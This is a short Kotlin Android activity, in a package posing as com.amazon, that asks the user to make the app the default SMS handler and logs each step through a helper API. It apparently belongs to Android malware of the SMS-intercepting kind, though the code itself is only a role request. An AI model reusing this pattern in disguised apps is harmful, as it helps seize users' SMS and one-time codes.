package com.amazon.zzz.Activities

import android.app.Activity
import android.app.role.RoleManager
import android.os.Build
import android.os.Bundle
import com.amazon.zzz.ApiNm.apiUt

class actChangeSmsManager : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        apiUt.sendLogs(this, "", "actChangeSmsManager onCreate", "log")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = getSystemService(RoleManager::class.java)
            val isRoleAvailable = roleManager.isRoleAvailable(RoleManager.ROLE_SMS)
            if (isRoleAvailable) {
                apiUt.sendLogs(this, "", "actChangeSmsManager isRoleAvailable", "log")
                val isRoleHeld = roleManager.isRoleHeld(RoleManager.ROLE_SMS)
                apiUt.sendLogs(this, "", "actChangeSmsManager isRoleHeld $isRoleHeld", "log")
                if (!isRoleHeld) {
                    apiUt.sendLogs(this, "", "actChangeSmsManager startActivityForResult ROLE_SMS", "log")
                    val roleRequestIntent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS)
                    startActivityForResult(roleRequestIntent, 1)
                    finish()
                }
            }
        } else {
            finish()
        }
    }

}